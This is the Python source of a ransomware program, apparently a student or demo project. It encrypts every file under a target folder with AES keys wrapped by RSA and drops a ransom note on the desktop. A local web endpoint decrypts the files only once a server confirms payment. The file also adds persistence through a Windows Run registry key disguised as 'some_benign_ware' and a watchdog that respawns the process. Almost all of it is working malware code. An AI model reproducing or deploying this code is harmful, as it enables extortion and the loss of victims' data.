import os
import http_requests
import aes_cipher
import rsa_cipher
import shutil
import psutil
from fastapi import FastAPI
import uvicorn
import multiprocessing
import winreg as reg   


EXPLANATION_FILENAME = 'YOUR_FILES_ENCRYPTED.txt'
ENCRYPTED_FILE_TAG = 'ransom_encrypted'
DIRECTORY_TO_ENCRYPT = 'RANSOM'


########## LOCAL FASTAPI ##########

app = FastAPI()

@app.on_event('startup')
async def startup():  
    await main()


@app.get("/attempt_decrypt/{transaction_id}")
async def attempt_decrypt(transaction_id: str):
    try:
        if not transaction_id:
            return 'Put the transaction id!'

        message = await decrypt_files(transaction_id)
        return message

    except Exception:
        return 'Unexpected error while attempting to decrypt files'



########## ENCRYPTION DECRYPTION LOGIC ##########


# def iterate_all_files():
#     # iterate over files in
#     # that directory
#     for root, dirs, files in os.walk('C:\\'):
#         for filename in files:
#             print(os.path.join(root, filename))


# key always on line 2. Data begin from line 5
async def encrypt_file(filepath):
    try:     
        with open(filepath, 'rb') as file:
            data = file.read()

        key = aes_cipher.generate_key()
        encripted_data = aes_cipher.encrypt(key, data)

        new_file_data = encripted_data.decode('utf-8')
        encrypted_key = rsa_cipher.encrypt(key)
        encrypted_key = encrypted_key.decode('utf-8')

        new_file_body = f'-----KEY BEGIN-----\n{encrypted_key}\n-----KEY END-----\n\n{new_file_data}'

        with open(filepath, 'w') as file:
            file.write(new_file_body)

        os.rename(filepath, f'{filepath}.{ENCRYPTED_FILE_TAG}')

        print(f'File encryption successfull - {filepath}')

    except Exception as e:
        print(f'problem encrypting file - {filepath}. Skipping it.')
        print(e.message)

async def decrypt_file(filepath):
    try:
        with open(filepath, 'rb') as file:
            content = file.read().splitlines()
            filename = file.name

        encrypted_aes_key = content[1] # in line 2
        aes_key = rsa_cipher.decrypt(encrypted_aes_key.decode('utf-8'))

        data = content[4:][0] # actualy body begins from line 5
        original_file_body = aes_cipher.decrypt(aes_key, data)

        with open(filepath, 'wb') as file:
            file.write(original_file_body)

        original_filename = filename.split('.')[:-1]
        original_filename = '.'.join(original_filename)

        os.rename(filepath, original_filename)

        print(f'File decryption successfull - {filepath} to {original_filename}')

    except Exception as e:
        print(f'problem decrypting file - {filepath}')
        print(e.message)


async def encrypt_files():
    # iterate recursively
    for subdir, dirs, files in os.walk(DIRECTORY_TO_ENCRYPT):
        for file in files:
            filepath = os.path.join(subdir, file)
            if file.split('.')[-1] != ENCRYPTED_FILE_TAG: # if already encrypted skip
                await encrypt_file(filepath)

async def decrypt_files(transaction_id):
    encrypted_fernet_key = rsa_cipher.get_encrypted_fernet_key()

    data = await http_requests.request_fernet_decryption(encrypted_fernet_key, transaction_id)

    if type(data) == dict and 'failed' in data:
        message = 'Server doesnt want to decrypt key. You have to pay first'
        print(message)
        return message

    fernet_key = data

    rsa_cipher.init_decryptor(fernet_key.encode('ascii'))

    # iterate recursively
    for subdir, dirs, files in os.walk(DIRECTORY_TO_ENCRYPT):
        for file in files:
            filepath = os.path.join(subdir, file)
            if file.split('.')[-1] == ENCRYPTED_FILE_TAG: # if encrypted
                await decrypt_file(filepath)

    return 'Successfully decrypted files. If you want to use service again please run the ransomware again :)'


# if not exists locally retrieve from server
async def get_server_public_key():
    file_name = "./keys/public.pem"

    try:
        if(os.stat(file_name).st_size != 0):
            return;

    except:
        pass

    #a file with that name doesnot exist on this library or there is no data.
    #we will request from the server the public key
    try:
        data = await http_requests.request_server_public_key()
        print(type(data))
        if type(data) == dict and 'failed' in data:
            print('the server cant generate a public key for usage')
            return
        
        
        with open(file_name,"w") as f:
            f.write(data)

    except Exception as e:
        print(f'Problem retrieving public key from server - {e.message}')
    

########## WATCHDOG AND PERSISTENCY ##########

def watchdog(selected_pid):
    import time
    print(f'ransomware watchdog pid: {str(os.getpid())}')

    while True:
        time.sleep(5)
        #print(selected_pid)
        if not psutil.pid_exists(selected_pid):
            p = multiprocessing.Process(target=main_helper, args=())
            p.start()
            selected_pid = p.pid
            print(f'ransomware main pid: {str(selected_pid)}')
    
def set_watchdog():
    pid_main = os.getpid()
    p = multiprocessing.Process(target=watchdog, args=(pid_main,))
    p.start()


def persistence():
    try:
        with open('start.bat','w') as f:
            f.write('timeout /t 15\n')
            f.write(f'chdir /d \"{str(os.getcwd())}\"\n')
            f.write(f'python \"{str(os.getcwd())}\main.py\"\nexit')

    except Exception as e:
        print(f'Problem establishing persistancy - {e.message}')


    current_path = str(os.getcwd()) + '\\start.bat'       
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    with reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) as open_:
        reg.SetValueEx(open_,"some_benign_ware",0,reg.REG_SZ,current_path)
        reg.CloseKey(open_)

    print('Wrote ransomware on startup successfully')



########## MAIN ##########

def create_dir(path):
    isExists = os.path.exists(path)
    isDir = os.path.isdir(path)
    
    if(isExists and not isDir):
        return "wrong path"

    if(not isExists):
        os.makedirs(path)

async def main():
    create_dir('./keys/')
    await get_server_public_key()
    rsa_cipher.setup()

    await encrypt_files()

    # copy explanation file to desktop
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    shutil.copy(EXPLANATION_FILENAME, desktop_path)

    print('Successully encrypted files')


def main_helper():
    persistence()
    print(f'ransomware main pid: {str(os.getpid())}')
    uvicorn.run("main:app", port=8074, host='127.0.0.1')


if __name__ == "__main__":
    set_watchdog()
    main_helper()
